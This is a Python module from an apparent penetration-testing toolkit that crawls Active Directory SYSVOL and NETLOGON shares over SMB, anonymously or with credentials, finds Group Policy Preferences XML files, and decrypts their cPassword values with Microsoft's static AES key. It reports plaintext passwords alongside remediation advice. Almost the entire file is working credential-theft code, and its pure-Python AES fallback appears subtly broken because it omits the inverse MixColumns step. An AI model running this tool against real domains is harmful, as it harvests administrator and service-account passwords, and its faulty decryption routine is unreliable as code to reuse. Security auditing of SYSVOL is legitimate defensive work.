"""
Expedite Strike — GPP / cPassword SYSVOL Scanner
=================================================
For authorized penetration testing only.
Crawls SYSVOL for Group Policy Preferences files containing
encrypted cPassword values and decrypts them using Microsoft's
publicly-disclosed static AES key.

MITRE ATT&CK:
  T1552.006 — Unsecured Credentials: Group Policy Preferences
  T1003     — OS Credential Dumping

Background:
  Prior to MS14-025, Group Policy Preferences (GPP) allowed admins to
  set local user passwords via XML files stored in SYSVOL. These were
  encrypted with a static AES-256 key that Microsoft published in
  MSDN documentation — making decryption trivial.

  Affected files in SYSVOL:
    Groups.xml          (local admin passwords)
    Services.xml        (service account passwords)
    Scheduledtasks.xml  (scheduled task run-as passwords)
    DataSources.xml     (SQL connection strings)
    Printers.xml        (printer connections)
"""

import os
import re
import base64
import socket
import struct
import xml.etree.ElementTree as ET
from typing import Callable, Dict, List, Optional


_log_fn: Optional[Callable] = None

# Microsoft's static AES key for GPP cPassword (MS14-025)
# Source: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref
GPP_AES_KEY = bytes([
    0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9,
    0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
    0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
    0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
])

# GPP files that may contain cPassword
GPP_FILES = [
    "Groups.xml",
    "Services.xml",
    "ScheduledTasks.xml",
    "DataSources.xml",
    "Printers.xml",
    "Drives.xml",
]

MITRE = [
    {"id": "T1552.006", "name": "Unsecured Credentials: Group Policy Preferences"},
    {"id": "T1003",     "name": "OS Credential Dumping"},
]


def _log(msg: str):
    if _log_fn:
        _log_fn(msg)
    else:
        print(msg)


# ── cPassword Decryption ───────────────────────────────────────────────────────

def decrypt_cpassword(cpassword: str) -> str:
    """
    Decrypt a GPP cPassword value using Microsoft's static AES-256-CBC key.

    Args:
        cpassword: Base64-encoded encrypted password from GPP XML

    Returns:
        Decrypted plaintext password, or empty string on failure
    """
    try:
        # GPP cPassword uses non-standard base64 padding
        padded = cpassword + "=" * (4 - len(cpassword) % 4) if len(cpassword) % 4 else cpassword
        ciphertext = base64.b64decode(padded)
    except Exception:
        return ""

    try:
        from Crypto.Cipher import AES
        iv     = b"\x00" * 16
        cipher = AES.new(GPP_AES_KEY, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(ciphertext)
        # Remove PKCS7 padding
        pad_len   = decrypted[-1] if isinstance(decrypted[-1], int) else ord(decrypted[-1])
        if 1 <= pad_len <= 16:
            decrypted = decrypted[:-pad_len]
        # Decode UTF-16LE (Windows default)
        return decrypted.decode("utf-16-le", errors="replace").rstrip("\x00")
    except ImportError:
        pass

    # Fallback: pure Python AES-256-CBC
    try:
        return _pure_python_aes_cbc_decrypt(ciphertext, GPP_AES_KEY)
    except Exception:
        return ""


def _pure_python_aes_cbc_decrypt(ciphertext: bytes, key: bytes) -> str:
    """Pure Python AES-256-CBC decryption (no Crypto dependency)."""
    # AES S-box
    SBOX = [
        0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
        0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
        0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
        0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
        0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
        0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
        0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
        0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
        0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
        0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
        0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
        0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
        0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
        0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
        0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
        0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16,
    ]

    def _xtime(a):
        return ((a << 1) ^ 0x1b) & 0xff if a & 0x80 else a << 1

    def _mix_col(s):
        a = [s[i] for i in range(4)]
        b = [_xtime(x) for x in a]
        return [
            b[0] ^ a[3] ^ a[2] ^ b[1] ^ a[1],
            b[1] ^ a[0] ^ a[3] ^ b[2] ^ a[2],
            b[2] ^ a[1] ^ a[0] ^ b[3] ^ a[3],
            b[3] ^ a[2] ^ a[1] ^ b[0] ^ a[0],
        ]

    def _key_expansion(key):
        RCON = [0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36,0x6c,0xd8,0xab,0x4d,0x9a]
        nk   = len(key) // 4
        nr   = nk + 6
        w    = [list(key[i*4:(i+1)*4]) for i in range(nk)]
        for i in range(nk, 4*(nr+1)):
            temp = list(w[i-1])
            if i % nk == 0:
                temp = [SBOX[temp[j]] ^ ([RCON[(i//nk)-1],0,0,0][j]) for j in range(4)]
            elif nk > 6 and i % nk == 4:
                temp = [SBOX[b] for b in temp]
            w.append([w[i-nk][j] ^ temp[j] for j in range(4)])
        return w

    def _add_round_key(state, rk):
        return [[state[r][c] ^ rk[c*4+r//4] for c in range(4)] for r in range(4)]

    def _decrypt_block(block, round_keys):
        state = [[block[r + 4*c] for c in range(4)] for r in range(4)]
        nr    = len(round_keys) // 4 - 1
        # flatten round key
        def _rk(n): return [round_keys[n*4+c][r] for r in range(4) for c in range(4)]
        state = _add_round_key(state, _rk(nr))
        for rnd in range(nr-1, 0, -1):
            # Inverse ShiftRows
            state[1] = [state[1][3],state[1][0],state[1][1],state[1][2]]
            state[2] = [state[2][2],state[2][3],state[2][0],state[2][1]]
            state[3] = [state[3][1],state[3][2],state[3][3],state[3][0]]
            # Inverse SubBytes
            INV_SBOX = [0]*256
            for i,v in enumerate(SBOX): INV_SBOX[v] = i
            state = [[INV_SBOX[state[r][c]] for c in range(4)] for r in range(4)]
            state = _add_round_key(state, _rk(rnd))
        # Last round
        state[1] = [state[1][3],state[1][0],state[1][1],state[1][2]]
        state[2] = [state[2][2],state[2][3],state[2][0],state[2][1]]
        state[3] = [state[3][1],state[3][2],state[3][3],state[3][0]]
        INV_SBOX = [0]*256
        for i,v in enumerate(SBOX): INV_SBOX[v] = i
        state = [[INV_SBOX[state[r][c]] for c in range(4)] for r in range(4)]
        state = _add_round_key(state, _rk(0))
        return bytes([state[r][c] for c in range(4) for r in range(4)])

    try:
        round_keys = _key_expansion(list(key))
        iv         = bytes(16)
        plaintext  = b""
        prev       = iv
        for i in range(0, len(ciphertext), 16):
            blk = ciphertext[i:i+16]
            if len(blk) < 16:
                break
            dec   = _decrypt_block(blk, round_keys)
            plain = bytes(dec[j] ^ prev[j] for j in range(16))
            plaintext += plain
            prev = blk
        # Remove padding and decode UTF-16LE
        if plaintext:
            pad = plaintext[-1]
            if 1 <= pad <= 16:
                plaintext = plaintext[:-pad]
        return plaintext.decode("utf-16-le", errors="replace").rstrip("\x00")
    except Exception:
        return ""


# ── XML Parsing ────────────────────────────────────────────────────────────────

def parse_gpp_xml(xml_content: str, source_file: str = "") -> List[Dict]:
    """
    Parse a GPP XML file and extract all cPassword values.

    Args:
        xml_content:  XML file content as string
        source_file:  Filename for context (e.g. Groups.xml)

    Returns:
        List of {username, encrypted_password, decrypted_password, source}
    """
    credentials = []

    try:
        root = ET.fromstring(xml_content)
    except ET.ParseError:
        return credentials

    # Search entire tree for cpassword attributes
    for elem in root.iter():
        props = elem.attrib
        cpassword = props.get("cpassword") or props.get("cPassword") or ""
        if not cpassword:
            continue

        username = (
            props.get("userName") or props.get("username") or
            props.get("runAs") or props.get("name") or "unknown"
        )
        decrypted = decrypt_cpassword(cpassword)

        credentials.append({
            "username":           username,
            "encrypted_password": cpassword,
            "decrypted_password": decrypted,
            "source":             source_file,
            "element_tag":        elem.tag,
        })

        _log(f"  [GPP] ✅ cPassword found in {source_file}")
        _log(f"  [GPP]    User     : {username}")
        _log(f"  [GPP]    Encrypted: {cpassword[:30]}...")
        if decrypted:
            _log(f"  [GPP]    Decrypted: {decrypted}")

    return credentials


# ── SYSVOL Crawler ─────────────────────────────────────────────────────────────

def crawl_sysvol_smb(
    dc_ip: str,
    domain: str,
    username: str = "",
    password: str = "",
    log_fn: Callable = None,
) -> Dict:
    """
    Crawl SYSVOL share on DC via SMB, find and parse all GPP XML files.

    Args:
        dc_ip:    Domain Controller IP
        domain:   AD domain name
        username: SMB username (empty = anonymous)
        password: SMB password
        log_fn:   Logging callback

    Returns:
        {credentials, findings, files_scanned, mitre}
    """
    global _log_fn
    _log_fn = log_fn

    credentials  = []
    files_scanned = []
    findings     = []

    _log(f"  [GPP] Crawling SYSVOL on {dc_ip} ({domain})...")

    try:
        from impacket.smbconnection import SMBConnection

        conn = SMBConnection(dc_ip, dc_ip, timeout=10)
        try:
            if username:
                conn.login(username, password, domain)
                _log(f"  [GPP] Authenticated as {username}@{domain}")
            else:
                conn.login("", "")
                _log(f"  [GPP] Anonymous bind to SYSVOL")
        except Exception as auth_err:
            _log(f"  [GPP] Auth failed: {auth_err}")
            return {"credentials": [], "findings": [], "files_scanned": [], "mitre": MITRE}

        def _crawl_share(share: str, path: str = "\\", depth: int = 0):
            if depth > 8:
                return
            try:
                items = conn.listPath(share, path + "*")
                for item in items:
                    name = item.get_longname()
                    if name in (".", ".."):
                        continue
                    full_path = path + name

                    if item.is_directory():
                        _crawl_share(share, full_path + "\\", depth + 1)
                    elif any(name.lower() == gf.lower() for gf in GPP_FILES):
                        _log(f"  [GPP] Found: \\\\{dc_ip}\\{share}{full_path}")
                        files_scanned.append(full_path)
                        # Read file content
                        try:
                            buf = []
                            conn.getFile(share, full_path, lambda x: buf.append(x))
                            content = b"".join(buf).decode("utf-8", errors="replace")
                            creds = parse_gpp_xml(content, name)
                            credentials.extend(creds)
                        except Exception as read_err:
                            _log(f"  [GPP] Read error {full_path}: {read_err}")
            except Exception:
                pass

        _crawl_share("SYSVOL")
        _crawl_share("NETLOGON")
        conn.close()

    except ImportError:
        _log("  [GPP] impacket not installed")
        return {"credentials": [], "findings": [], "files_scanned": [], "mitre": MITRE}
    except Exception as e:
        _log(f"  [GPP] SYSVOL crawl error: {e}")

    # Build findings
    for cred in credentials:
        sev = "Critical" if cred.get("decrypted_password") else "High"
        findings.append({
            "title":       f"GPP cPassword Found — {cred['username']}",
            "severity":    sev,
            "description": (
                f"Group Policy Preferences file {cred['source']} contains a cPassword "
                f"for user '{cred['username']}'. "
                + (
                    f"Password successfully decrypted: '{cred['decrypted_password']}'. "
                    if cred.get("decrypted_password") else
                    "Password encrypted with static AES key (MS14-025). "
                ) +
                f"These credentials may provide local admin or domain access."
            ),
            "target":      dc_ip,
            "username":    cred["username"],
            "password":    cred.get("decrypted_password", ""),
            "source":      cred["source"],
            "mitre_id":    "T1552.006",
            "mitre_name":  "Unsecured Credentials: Group Policy Preferences",
            "remediation": (
                "Apply MS14-025. Remove all cPassword values from SYSVOL immediately. "
                "Run 'Get-GPPPassword' (PowerSploit) to identify all occurrences. "
                "Rotate any affected credentials immediately."
            ),
        })

    _log(f"\n  [GPP] Scanned {len(files_scanned)} GPP file(s)")
    _log(f"  [GPP] Found {len(credentials)} cPassword credential(s)")

    return {
        "credentials":   credentials,
        "findings":      findings,
        "files_scanned": files_scanned,
        "mitre":         MITRE,
        "summary":       f"GPP: {len(credentials)} credential(s) from {len(files_scanned)} file(s)",
    }


# ── Local SYSVOL Scan (mounted drive) ─────────────────────────────────────────

def scan_local_sysvol(sysvol_path: str = "", log_fn: Callable = None) -> Dict:
    """
    Scan a locally mounted SYSVOL path for GPP XML files.
    Useful when running from a domain-joined machine.

    Args:
        sysvol_path: Path to SYSVOL (e.g. C:\\Windows\\SYSVOL or \\\\DC\\SYSVOL)
        log_fn:      Logging callback

    Returns:
        {credentials, findings, files_scanned, mitre}
    """
    global _log_fn
    _log_fn = log_fn

    if not sysvol_path:
        # Common paths
        for p in [
            r"C:\Windows\SYSVOL",
            r"C:\Windows\SYSVOL\sysvol",
            r"\\localhost\SYSVOL",
        ]:
            if os.path.exists(p):
                sysvol_path = p
                break

    if not sysvol_path or not os.path.exists(sysvol_path):
        _log(f"  [GPP] SYSVOL not found locally — use crawl_sysvol_smb() instead")
        return {"credentials": [], "findings": [], "files_scanned": [], "mitre": MITRE}

    _log(f"  [GPP] Scanning local SYSVOL: {sysvol_path}")

    credentials  = []
    files_scanned = []
    findings     = []

    for dirpath, dirnames, filenames in os.walk(sysvol_path):
        for fname in filenames:
            if any(fname.lower() == gf.lower() for gf in GPP_FILES):
                fpath = os.path.join(dirpath, fname)
                files_scanned.append(fpath)
                _log(f"  [GPP] Checking: {fpath}")
                try:
                    with open(fpath, "r", encoding="utf-8", errors="replace") as f:
                        content = f.read()
                    creds = parse_gpp_xml(content, fname)
                    credentials.extend(creds)
                except Exception as e:
                    _log(f"  [GPP] Read error: {e}")

    for cred in credentials:
        findings.append({
            "title":       f"GPP cPassword Found — {cred['username']}",
            "severity":    "Critical",
            "description": (
                f"cPassword found in {cred['source']} for '{cred['username']}': "
                f"decrypted='{cred.get('decrypted_password', '')}'"
            ),
            "target":      sysvol_path,
            "username":    cred["username"],
            "password":    cred.get("decrypted_password", ""),
            "mitre_id":    "T1552.006",
            "mitre_name":  "Unsecured Credentials: Group Policy Preferences",
            "remediation": "Apply MS14-025. Remove cPassword values. Rotate credentials.",
        })

    return {
        "credentials":   credentials,
        "findings":      findings,
        "files_scanned": files_scanned,
        "mitre":         MITRE,
        "summary":       f"Local SYSVOL: {len(credentials)} cPassword(s) in {len(files_scanned)} file(s)",
    }


# ── Top-Level API ──────────────────────────────────────────────────────────────

def run_gpp_scan(
    dc_ip: str,
    domain: str = "",
    username: str = "",
    password: str = "",
    log_fn: Callable = None,
) -> Dict:
    """
    Full GPP cPassword scan — tries SMB crawl then local scan.

    Args:
        dc_ip:    Domain Controller IP (or DC hostname)
        domain:   AD domain
        username: SMB credentials (empty = anonymous)
        password: SMB password
        log_fn:   Logging callback

    Returns:
        {credentials, findings, files_scanned, mitre, summary}
    """
    global _log_fn
    _log_fn = log_fn

    _log(f"\n{'='*60}")
    _log(f"  [GPP] GPP / cPassword SYSVOL Scanner")
    _log(f"  [GPP] DC     : {dc_ip}")
    _log(f"  [GPP] Domain : {domain}")
    _log(f"{'='*60}\n")

    # Try SMB crawl first
    result = crawl_sysvol_smb(dc_ip, domain, username, password, log_fn)

    # If no results, try local SYSVOL
    if not result["credentials"] and not result["files_scanned"]:
        _log("  [GPP] No SMB results — trying local SYSVOL scan...")
        local = scan_local_sysvol(log_fn=log_fn)
        result["credentials"].extend(local["credentials"])
        result["findings"].extend(local["findings"])
        result["files_scanned"].extend(local["files_scanned"])

    if not result["credentials"]:
        _log("  [GPP] No cPassword values found (environment may be patched or SYSVOL inaccessible)")
        result["findings"].append({
            "title":       "GPP cPassword — Not Found",
            "severity":    "Info",
            "description": (
                "No GPP cPassword values found in SYSVOL. "
                "Environment may be patched (MS14-025) or SYSVOL is inaccessible. "
                "This is the expected secure state."
            ),
            "target":      dc_ip,
            "mitre_id":    "T1552.006",
            "mitre_name":  "Unsecured Credentials: Group Policy Preferences",
            "remediation": "Continue enforcing MS14-025. Audit SYSVOL regularly.",
        })

    return result
